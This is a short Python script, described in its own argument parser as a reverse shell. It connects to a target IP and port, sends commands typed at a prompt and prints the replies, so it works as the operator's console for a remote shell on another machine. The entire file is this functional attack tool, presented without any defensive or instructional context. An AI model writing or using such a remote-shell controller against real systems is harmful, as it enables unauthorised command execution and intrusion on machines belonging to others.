import select
import socket
import argparse
import threading

parser = argparse.ArgumentParser("Reverse shell made with python")
parser.add_argument("-I", "--ip", type=str, help="Target IP")
parser.add_argument("-p", "--port", type=int, help="Target port")
args = parser.parse_args()
IP = args.ip
PORT = args.port
HEADER = 64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def check_data(s):
    return select.select([s], [], [], 0)[0]

def receiver(s):
    output = ""
    while check_data(s):
        output += s.recv(HEADER).decode('utf-8')
    return output


def start(s):
    connected = True
    received = False
    while connected:
        command = input(">>> ").replace(r'\n', '\n')
        if command == '':
            command = "\n"
        s.sendall(bytes(command, 'utf-8'))
        if not check_data(s):
            received = False
        while not received:
            #print("NOT")
            #print(check_data(s))
            if check_data(s):
                received = True
        output = receiver(s)
        print(output)
        

if __name__ == "__main__":
    start(s)

